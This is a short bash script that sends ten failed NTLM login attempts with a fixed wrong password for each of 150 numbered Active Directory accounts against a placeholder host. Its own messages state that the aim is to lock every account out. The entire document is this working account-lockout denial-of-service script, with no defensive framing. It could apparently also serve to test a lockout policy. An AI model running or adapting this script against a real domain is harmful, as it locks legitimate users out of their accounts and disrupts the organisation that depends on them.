#!/bin/bash
for i in {1..150}
do
	id=$(printf %05d $i)
        printf "Locking $id"
	for j in {1..10}
	do
		curl https://example.com --ntlm --user AD-DOMAIN\\$id:makan
	done
	printf "\n $id... should be locked now\n\n" $i
done
